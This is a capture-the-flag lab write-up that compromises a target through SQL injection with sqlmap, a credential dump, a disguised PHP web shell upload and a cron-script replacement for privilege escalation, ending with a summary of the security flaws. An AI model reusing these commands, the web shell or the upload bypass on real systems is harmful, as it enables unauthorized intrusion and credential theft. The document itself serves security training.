# Daemon Slayer – Part 1 - Web Enumeration, SQL Injection, File Upload RCE and Cron Privilege Escalation

## 1. Target Enumeration

An initial Nmap scan was performed:

```bash
nmap -sV -sC -Pn -oA daemon 10.10.0.53
```

Parameters:

* `-sV`: detects services and versions.
* `-sC`: runs default NSE scripts.
* `-Pn`: skips host discovery.
* `-oA daemon`: saves the scan results.

Results:

```bash
80/tcp  open  http  Apache/2.4.68 (Debian)
445/tcp open  http  Apache/2.4.68 (Debian)
```



## 2. Web Enumeration

Gobuster was first used against port `80`:

```bash
gobuster dir \
-u http://10.10.0.53/ \
-w ~/work/Pentest/Wordlist/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

Result:

```bash
/lower/
```

The page was inspected:

```bash
curl -s http://10.10.0.53/lower/
```

A useful HTML comment was found:

```html
<!-- 445 is samba, right ? -->
```

Port `445` was therefore enumerated as a Web service:

```bash
gobuster dir \
-u http://10.10.0.53:445/ \
-w ~/work/Pentest/Wordlist/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

Result:

```bash
/upper/
```

The directory hosted an application : "Demon Human Food Tracker"



## 3. Admin Interface and SQL Injection

The administration interface was accessible at:

```bash
http://10.10.0.53:445/upper/admin/
```

The server returned the full dashboard before executing a JavaScript redirect to the login page.

The `Reports` section used:

```bash
date_start
date_end
```

SQLmap was used against `date_start` parameter :

```bash
sqlmap \
-u 'http://10.10.0.53:445/upper/admin/?page=reports&date_start=2026-08-29&date_end=2026-09-01' \
-p date_start \
--batch \
--dbms=mysql \
--technique=T
```

Result:

```bash
Parameter: date_start
Type: time-based blind
DBMS: MySQL / MariaDB
```


## 4. Credential Extraction

The application database was:

```bash
daemon
```

The `users` table was dumped:

```bash
sqlmap -u 'http://10.10.0.53:445/upper/admin/?page=reports&date_start=2026-08-29&date_end=2026-09-01' -p date_start --batch --dbms=mysql --technique=T -D daemon -T users -C username,password -dump
```

Credentials recovered:

```bash
Username: muzan
Hash:     0192023a7bbd73250516f069df18b500
Password: admin123
```

The password was recovered from the MD5 hash.



## 5. Web Authentication

The JavaScript revealed the authentication endpoint:

```bash
/upper/classes/Login.php?f=login
```

A session cookie was created:

```bash
curl -s -c cookies.txt \
http://10.10.0.53:445/upper/admin/login.php \
-o /dev/null
```

The credentials were then submitted:

```bash
curl -s \
-b cookies.txt \
-c cookies.txt \
-X POST \
'http://10.10.0.53:445/upper/classes/Login.php?f=login' \
-d 'username=muzan&password=admin123'
```

Result:

```json
{"status":"success"}
```

This confirmed successful authentication.



## 6. File Upload and Remote Code Execution

The `Settings` page contained a logo upload field:

```html
<input type="file" name="img">
```

A PHP file was uploaded while declaring an image MIME type:

```bash
curl -s \
-b cookies.txt \
-X POST \
'http://10.10.0.53:445/upper/classes/SystemSettings.php?f=update_settings' \
-F 'name=Demon Human Food Tracker' \
-F 'short_name=DHFT' \
-F 'img=@cmd.php;type=image/jpeg'
```

The PHP file contained:

```php
<?php system($_GET["cmd"]); ?>
```

Command execution was tested:

```bash
curl 'http://10.10.0.53:445/upper/uploads/1788253620_cmd.php?cmd=id'
```

Result:

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirmed Remote Code Execution as:

```bash
www-data
```



## 7. Local Enumeration and Cron Privilege Escalation

The local users were inspected:

```bash
ls -la /home
```

A user was identified:

```bash
/home/muzan
```

Permissions prevented `www-data` from accessing the directory:

```bash
drwx------ muzan muzan /home/muzan
```

The system crontab was checked:

```bash
cat /etc/crontab
```

Result:

```bash
* * * * * muzan /var/www/scripts/immortality_check.sh
```

This script was executed every minute as `muzan`.

Permissions were inspected:

```bash
ls -ld /var/www/scripts
ls -l /var/www/scripts/immortality_check.sh
```

Results:

```bash
drwxr-xr-x www-data www-data /var/www/scripts

-rwxr-xr-x muzan muzan immortality_check.sh
```

The script itself was not writable by `www-data`, but the parent directory was.

Because `www-data` owned the directory, it could delete and recreate the script.

The script was replaced with:

```bash
#!/bin/sh
cat /home/muzan/user.txt > /tmp/user_flag.txt
```

It was then made executable:

```bash
chmod 755 /var/www/scripts/immortality_check.sh
```

Cron executed the new script as `muzan`.



## 8. User Flag

The generated file was retrieved:

```bash
cat /tmp/user_flag.txt
```

Result:

```bash
EPI{j00_H4V3_n0_cH01C3_8UT_t0_90_0n_l1v1n9}
```

The file belonged to `muzan`:

```bash
-rw-rw-r-- 1 muzan muzan /tmp/user_flag.txt
```

This confirmed that the cron job executed the malicious script with `muzan` privileges.



## Attack Path Summary

```bash
Nmap enumeration
        ↓
HTTP services on ports 80 and 445
        ↓
Gobuster on port 80
        ↓
/lower/
        ↓
HTML comment points to port 445
        ↓
Gobuster on port 445
        ↓
/upper/
        ↓
Admin dashboard exposed
        ↓
Time-based blind SQL injection
        ↓
Muzan credentials recovered
        ↓
Web authentication
        ↓
Unsafe PHP file upload
        ↓
Remote Code Execution
        ↓
www-data
        ↓
Cron enumeration
        ↓
Writable /var/www/scripts directory
        ↓
immortality_check.sh replaced
        ↓
Cron executes script as muzan
        ↓
/home/muzan/user.txt
        ↓
User flag retrieved
```

## Main Security Issues Identified

1. Hidden Web directories discoverable through enumeration.
2. Administrative content exposed without proper server-side access control.
3. Time-based blind SQL injection in `date_start`.
4. Weak MD5 password storage.
5. Unsafe file upload allowing PHP execution.
6. Remote command execution as `www-data`.
7. Writable directory containing a script executed by cron as `muzan`.
8. Cron privilege escalation allowing access to `user.txt`.
